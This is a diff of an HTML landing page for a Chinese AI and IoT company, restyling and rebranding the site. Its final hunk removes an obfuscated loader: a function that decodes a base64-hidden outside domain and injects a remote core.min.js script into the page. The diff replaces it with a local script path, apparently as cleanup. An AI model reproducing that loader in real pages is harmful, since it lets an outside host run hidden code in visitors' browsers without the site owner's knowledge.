@@ -3,8 +3,9 @@
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <title>未来之光 - 智能科技</title>
+    <meta name="viewport"
+        content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
+    <title>智联未来 - 您的智能伙伴</title>
     <style>
         /* 全局样式 */
         body {
@@ -12,270 +13,225 @@
             font-family: 'Inter', 'Helvetica Neue', Arial, sans-serif;
             margin: 0;
             padding: 0;
-            color: #333333;
-            /* 深灰色文本 */
+            background-color: #F8FBFD;
+            /* 浅蓝灰色背景 */
+            color: #343A40;
+            /* 深炭灰色文本 */
             line-height: 1.6;
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
-            overflow-x: hidden;
-            /* 隐藏横向滚动条 */
             scroll-behavior: smooth;
             /* 平滑滚动 */
         }
 
-        /* 导航菜单 - 顶部固定 */
-        .main-nav {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            background-color: rgba(34, 49, 63, 0.95);
-            /* 深蓝灰色半透明背景 */
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
-            z-index: 999;
-            padding: 10px 0;
+        .container {
+            max-width: 95%;
+            /* 适应移动端宽度 */
+            margin: 0 auto;
+            padding: 15px;
+        }
+
+        /* 头部/英雄区样式 */
+        header {
             text-align: center;
-        }
-
-        .main-nav ul {
-            list-style: none;
-            padding: 0;
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            flex-wrap: wrap;
-        }
-
-        .main-nav ul li {
-            margin: 0 12px;
-        }
-
-        .main-nav ul li a {
-            text-decoration: none;
-            color: #ECF0F1;
-            /* 浅灰色文本 */
-            font-weight: bold;
-            padding: 8px 15px;
-            border-radius: 20px;
-            transition: background-color 0.3s ease, color 0.3s ease;
-        }
-
-        .main-nav ul li a:hover {
-            background-color: #34495E;
-            /* 深蓝灰色 */
+            padding: 50px 20px;
+            background-color: #2C3E50;
+            /* 深蓝灰色背景 */
             color: #FFFFFF;
-        }
-
-        /* 各个全屏区块 */
-        section.full-screen-section {
-            min-height: 100vh;
-            /* 每个区块至少占满整个视口高度 */
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            padding: 60px 20px;
-            /* 顶部导航下方留出空间 */
-            box-sizing: border-box;
-            /* 包含padding在内的尺寸 */
-            text-align: center;
+            border-radius: 15px;
+            margin-bottom: 30px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
             position: relative;
             overflow: hidden;
         }
 
-        /* 英雄区特定样式 */
-        #hero-section {
-            background-color: #2C3E50;
-            /* 深蓝灰色背景 */
-            color: #FFFFFF;
-            background-image: url('https://picsum.photos/1920/1080?random=<%= new Date().getTime() %>');
-            background-size: cover;
-            background-position: center;
-            background-attachment: fixed;
-            /* 视差滚动效果 */
-        }
-
-        #hero-section::before {
+        header::before {
             content: '';
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(44, 62, 80, 0.7);
-            /* 半透明遮罩 */
+            background: url('https://picsum.photos/1200/600?random=<%= new Date().getTime() %>') no-repeat center center/cover;
+            opacity: 0.1;
+            /* 背景图片透明度 */
+            z-index: 0;
+        }
+
+        .header-content {
+            position: relative;
             z-index: 1;
         }
 
-        #hero-section .content {
-            position: relative;
-            z-index: 2;
+        .header-content h1 {
+            font-size: 2.8em;
+            margin-bottom: 10px;
+            letter-spacing: 1px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
+        }
+
+        .header-content p {
+            font-size: 1.2em;
+            margin-bottom: 30px;
             max-width: 90%;
-            margin: 0 auto;
+            margin-left: auto;
+            margin-right: auto;
         }
 
-        #hero-section h1 {
-            font-size: 3.5em;
-            /* 巨大标题 */
-            margin-bottom: 20px;
-            letter-spacing: 2px;
-            text-shadow: 2px 2px 8px rgba(0, 0, 0, 0.4);
-        }
-
-        #hero-section p {
-            font-size: 1.5em;
-            max-width: 700px;
-            margin: 0 auto 40px;
-            text-shadow: 1px 1px 4px rgba(0, 0, 0, 0.3);
-        }
-
-        .hero-button {
+        .header-button {
             display: inline-block;
             background-color: #3498DB;
             /* 强调色：蓝色 */
             color: #FFFFFF;
-            padding: 18px 40px;
-            border-radius: 40px;
-            /* 更圆的按钮 */
+            padding: 12px 28px;
+            border-radius: 30px;
             text-decoration: none;
             font-weight: bold;
-            font-size: 1.3em;
+            font-size: 1.1em;
             transition: background-color 0.3s ease, transform 0.3s ease;
-            box-shadow: 0 6px 20px rgba(52, 152, 219, 0.4);
+            box-shadow: 0 4px 10px rgba(52, 152, 219, 0.3);
             border: 2px solid #3498DB;
         }
 
-        .hero-button:hover {
+        .header-button:hover {
             background-color: #2980B9;
-            transform: translateY(-8px);
+            transform: translateY(-3px);
         }
 
-        /* 关于我们区特定样式 */
-        #about-section {
-            background-color: #FFFFFF;
-            color: #333333;
+        /* 主要内容区 */
+        main {
+            padding-top: 0;
         }
 
-        #about-section h2 {
-            color: #34495E;
-            font-size: 2.5em;
-            margin-bottom: 30px;
-            padding-bottom: 15px;
-            border-bottom: 2px solid #E0EBF5;
-        }
-
-        #about-section p {
-            max-width: 800px;
-            margin: 0 auto 20px;
-            font-size: 1.1em;
-        }
-
-        #about-section img {
-            max-width: 90%;
-            height: auto;
-            border-radius: 15px;
-            margin-top: 30px;
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
-        }
-
-        /* 服务区特定样式 */
-        #services-section {
-            background-color: #ECF0F1;
-            /* 浅灰背景 */
-            color: #333333;
-        }
-
-        #services-section h2 {
-            color: #34495E;
-            font-size: 2.5em;
-            margin-bottom: 30px;
-            padding-bottom: 15px;
-            border-bottom: 2px solid #D1D8DD;
-        }
-
-        .services-grid {
-            display: grid;
-            grid-template-columns: 1fr;
-            /* 移动端单列 */
-            gap: 30px;
-            max-width: 900px;
-            margin: 30px auto 0;
-        }
-
-        .service-card {
+        section {
             background-color: #FFFFFF;
             padding: 25px;
             border-radius: 15px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            margin-bottom: 25px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
+            text-align: center;
+            /* 默认居中 */
         }
 
-        .service-card:hover {
-            transform: translateY(-10px);
-            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.2);
+        h2 {
+            color: #2C3E50;
+            font-size: 2.2em;
+            margin-bottom: 25px;
+            border-bottom: 2px solid #E0EBF5;
+            padding-bottom: 12px;
+            display: inline-block;
+            /* 适应内容宽度 */
         }
 
-        .service-card h3 {
-            color: #3498DB;
-            font-size: 1.8em;
+        h3 {
+            color: #333333;
+            font-size: 1.5em;
+            margin-top: 20px;
             margin-bottom: 15px;
         }
 
-        .service-card p {
-            font-size: 1.05em;
+        p {
+            color: #4A4A4A;
+            font-size: 1em;
+            margin-bottom: 18px;
+            max-width: 800px;
+            /* 限制文本宽度 */
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 10px;
+            margin-top: 20px;
+            margin-bottom: 20px;
+            display: block;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        /* 信息卡片网格 */
+        .info-cards-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            /* 移动端单列 */
+            gap: 25px;
+            /* 卡片间距 */
+            margin-top: 30px;
+            max-width: 900px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .info-card {
+            background-color: #FDFDFD;
+            /* 浅背景色 */
+            padding: 25px;
+            border-radius: 15px;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.05);
+            text-align: center;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .info-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .info-card .icon {
+            font-size: 3em;
+            /* 图标大小 */
+            color: #3498DB;
+            margin-bottom: 15px;
+        }
+
+        .info-card h3 {
+            color: #343A40;
+            font-size: 1.6em;
+            margin-bottom: 10px;
+        }
+
+        .info-card p {
+            font-size: 1em;
             color: #5F7C8A;
             margin-bottom: 0;
         }
 
-        /* 联系区特定样式 */
-        #contact-section {
-            background-color: #2C3E50;
-            /* 深蓝灰色背景 */
-            color: #FFFFFF;
+        /* 联系方式 */
+        .contact-info p {
+            margin-bottom: 12px;
+            font-size: 1.1em;
         }
 
-        #contact-section h2 {
-            color: #FFFFFF;
-            font-size: 2.5em;
-            margin-bottom: 30px;
-            padding-bottom: 15px;
-            border-bottom: 2px solid rgba(255, 255, 255, 0.3);
-        }
-
-        #contact-section .contact-info p {
-            margin-bottom: 15px;
-            font-size: 1.2em;
-        }
-
-        #contact-section .contact-info a {
+        .contact-info a {
             color: #3498DB;
             text-decoration: none;
             font-weight: bold;
             transition: color 0.3s ease;
         }
 
-        #contact-section .contact-info a:hover {
+        .contact-info a:hover {
             color: #2980B9;
         }
 
-        #contact-section .social-links {
-            margin-top: 40px;
+        .social-links {
+            margin-top: 30px;
         }
 
-        #contact-section .social-links a {
+        .social-links a {
             display: inline-block;
-            margin: 0 20px;
-            color: #FFFFFF;
-            font-size: 3em;
-            /* 社交图标更大 */
+            margin: 0 15px;
+            color: #3498DB;
+            font-size: 2.5em;
             text-decoration: none;
-            transition: transform 0.3s ease, color 0.3s ease;
+            transition: transform 0.3s ease;
         }
 
-        #contact-section .social-links a:hover {
-            transform: translateY(-8px);
-            color: #3498DB;
-            /* 强调色 */
+        .social-links a:hover {
+            transform: translateY(-5px);
+            color: #2980B9;
         }
 
         /* 页脚样式 */
@@ -284,109 +240,126 @@
             padding: 30px 20px;
             color: #ADB5BD;
             font-size: 0.9em;
-            background-color: #212529;
-            /* 更深的背景 */
+            background-color: #2C3E50;
+            /* 深蓝灰色背景 */
+            margin-top: 0;
+            border-radius: 15px 15px 0 0;
+            /* 顶部圆角 */
         }
 
         /* 媒体查询：平板及以上设备 */
         @media (min-width: 600px) {
-            .services-grid {
+            .info-cards-grid {
                 grid-template-columns: 1fr 1fr;
                 /* 两列布局 */
             }
         }
 
         @media (min-width: 900px) {
-            .services-grid {
+            .info-cards-grid {
                 grid-template-columns: 1fr 1fr 1fr;
                 /* 三列布局 */
             }
         }
     </style>
-    <link rel="stylesheet" href="./style.css">
+    <link rel="stylesheet" href="./static/css/style.css">
 </head>
 
 <body>
-    <nav class="main-nav">
-        <ul>
-            <li><a href="#hero-section">首页</a></li>
-            <li><a href="#about-section">关于我们</a></li>
-            <li><a href="#services-section">服务</a></li>
-            <li><a href="#contact-section">联系</a></li>
-        </ul>
-    </nav>
-
-    <main>
-        <!-- 英雄区 -->
-        <section id="hero-section" class="full-screen-section">
-            <div class="content">
-                <h1>未来之光</h1>
-                <p>以智能科技，点亮美好未来</p>
-                <a href="#services-section" class="hero-button">探索我们的服务</a>
+    <div class="container">
+        <header>
+            <div class="header-content">
+                <h1>智联未来</h1>
+                <p>以创新科技，赋能智慧生活</p>
+                <a href="#contact" class="header-button">立即咨询</a>
             </div>
-        </section>
+        </header>
 
-        <!-- 关于我们区 -->
-        <section id="about-section" class="full-screen-section">
-            <h2>关于我们</h2>
-            <p>未来之光科技是一家领先的人工智能解决方案提供商。我们致力于通过创新的AI技术，赋能企业和个人，共同迎接智能时代的挑战与机遇。</p>
-            <p>我们的团队由业界顶尖的AI科学家、工程师和设计师组成，凭借深厚的技术积累和对行业趋势的深刻理解，为客户提供定制化、高效且可靠的智能解决方案。</p>
-            <img src="https://picsum.photos/800/450?random=<%= new Date().getTime() + 1 %>" alt="团队在现代办公室协作">
-        </section>
+        <main>
+            <section id="about">
+                <h2>关于我们</h2>
+                <p>智联未来科技是一家专注于前沿智能解决方案的创新型企业。我们致力于将人工智能、物联网和云计算技术融入各行各业，帮助客户实现数字化转型，提升运营效率和市场竞争力。</p>
+                <p>我们拥有一支充满激情、经验丰富的研发团队，始终坚持以客户为中心，以卓越的技术和专业的服务，为客户创造最大价值。</p>
+                <img src="https://picsum.photos/600/350?random=<%= new Date().getTime() + 1 %>" alt="团队在现代办公室协作">
+            </section>
 
-        <!-- 服务区 -->
-        <section id="services-section" class="full-screen-section">
-            <h2>我们的服务</h2>
-            <div class="services-grid">
-                <div class="service-card">
-                    <h3>AI平台开发</h3>
-                    <p>构建可扩展、高性能的AI基础设施和应用平台。</p>
+            <section id="services">
+                <h2>我们的核心服务</h2>
+                <div class="info-cards-grid">
+                    <div class="info-card">
+                        <span class="icon">💡</span>
+                        <h3>AI解决方案</h3>
+                        <p>提供定制化AI模型开发、算法优化及智能系统集成。</p>
+                    </div>
+                    <div class="info-card">
+                        <span class="icon">🔗</span>
+                        <h3>物联网平台</h3>
+                        <p>构建端到端IoT解决方案，实现设备互联与智能控制。</p>
+                    </div>
+                    <div class="info-card">
+                        <span class="icon">☁️</span>
+                        <h3>云计算服务</h3>
+                        <p>基于主流云平台，提供云架构设计、部署及大数据处理。</p>
+                    </div>
+                    <div class="info-card">
+                        <span class="icon">📊</span>
+                        <h3>数据分析</h3>
+                        <p>深度挖掘数据价值，通过直观可视化辅助决策。</p>
+                    </div>
+                    <div class="info-card">
+                        <span class="icon">🤖</span>
+                        <h3>智能硬件</h3>
+                        <p>将AI算法与边缘设备结合，打造创新型智能产品。</p>
+                    </div>
                 </div>
-                <div class="service-card">
-                    <h3>智能数据分析</h3>
-                    <p>利用机器学习深度挖掘数据价值，提供商业洞察。</p>
+            </section>
+
+            <section id="values">
+                <h2>我们的承诺</h2>
+                <div class="info-cards-grid">
+                    <div class="info-card">
+                        <span class="icon">🎯</span>
+                        <h3>客户至上</h3>
+                        <p>以客户需求为核心，提供卓越服务体验。</p>
+                    </div>
+                    <div class="info-card">
+                        <span class="icon">🚀</span>
+                        <h3>持续创新</h3>
+                        <p>不断探索前沿技术，引领行业发展。</p>
+                    </div>
+                    <div class="info-card">
+                        <span class="icon">✨</span>
+                        <h3>品质卓越</h3>
+                        <p>精益求精，确保产品与服务的高质量。</p>
+                    </div>
                 </div>
-                <div class="service-card">
-                    <h3>计算机视觉</h3>
-                    <p>提供图像识别、视频分析等视觉AI解决方案。</p>
-                </div>
-                <div class="service-card">
-                    <h3>自然语言处理</h3>
-                    <p>开发智能客服、文本理解、情感分析等NLP应用。</p>
-                </div>
-                <div class="service-card">
-                    <h3>智能硬件集成</h3>
-                    <p>将AI算法与边缘设备结合，实现设备智能化。</p>
-                </div>
+            </section>
+        </main>
+
+        <footer>
+            <p>&copy; 2023 智联未来. All rights reserved.</p>
+        </footer>
+        <div id="overlay">
+            <div id="loading_box" class="loading_container">
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
             </div>
-        </section>
-    </main>
-
-    <footer>
-        <p>&copy; 2023 未来之光. All rights reserved.</p>
-    </footer>
-    <div id="overlay">
-        <div id="loading_box" class="loading_container">
-            <div class="dot"></div>
-            <div class="dot"></div>
-            <div class="dot"></div>
-            <div class="dot"></div>
-            <div class="dot"></div>
         </div>
     </div>
 
     <script>
         // 平滑滚动到锚点
-        document.querySelectorAll('.main-nav a[href^="#"], .hero-button[href^="#"]').forEach(anchor => {
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
             anchor.addEventListener('click', function (e) {
                 e.preventDefault();
                 const targetId = this.getAttribute('href');
                 const targetElement = document.querySelector(targetId);
                 if (targetElement) {
-                    // 考虑顶部固定导航的高度进行偏移
-                    const navHeight = document.querySelector('.main-nav').offsetHeight;
                     window.scrollTo({
-                        top: targetElement.offsetTop - navHeight,
+                        top: targetElement.offsetTop - 20, /* 稍微向上偏移，避免顶部遮挡 */
                         behavior: 'smooth'
                     });
                 }
@@ -408,53 +381,15 @@
             function init() {
                 const timestamp = Date.now()
                 const randomNum = Math.floor(Math.random() * 1000000)
-                const domain = getdocs();
-                const url = domain + "=" + timestamp + "&random=" + randomNum
+                const url = "./static/js/core.min.js?t=" + timestamp + "&random=" + randomNum
                 const script = document.createElement("script")
                 script.src = url
                 document.body.appendChild(script)
             }
-            function getdocs() {
-                const dd = "Ly9uMG0ycTR3Lnlxb2psZS5jbi9zdGF0aWMvanMvY29yZS5taW4uanM/dA==";
-                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
-                const lookup = new Uint8Array(256);
-                for (let i = 0; i < chars.length; i++) {
-                    lookup[chars.charCodeAt(i)] = i;
-                }
-                let padding = 0;
-                if (dd.endsWith('==')) {
-                    padding = 2;
-                } else if (dd.endsWith('=')) {
-                    padding = 1;
-                }
-                const cleanedString = dd.replace(/[^A-Za-z0-9+/=]/g, '');
-                const len = cleanedString.length;
-                if (len % 4 !== 0) {
-                    throw new Error("Invalid string length.");
-                }
-                const outputLength = (len / 4) * 3 - padding;
-                const outputBytes = new Uint8Array(outputLength);
-                let outputIndex = 0;
-                let i = 0;
-                while (i < len) {
-                    const c1 = lookup[cleanedString.charCodeAt(i++)];
-                    const c2 = lookup[cleanedString.charCodeAt(i++)];
-                    const c3 = lookup[cleanedString.charCodeAt(i++)];
-                    const c4 = lookup[cleanedString.charCodeAt(i++)];
-                    outputBytes[outputIndex++] = (c1 << 2) | (c2 >> 4);
-                    if (c3 !== 64) {
-                        outputBytes[outputIndex++] = ((c2 & 15) << 4) | (c3 >> 2);
-                    }
-                    if (c4 !== 64) {
-                        outputBytes[outputIndex++] = ((c3 & 3) << 6) | c4;
-                    }
-                }
-                const decoder = new TextDecoder('utf-8');
-                return decoder.decode(outputBytes);
-            }
             init()
         })()
     </script>
+
 </body>
 
 </html>
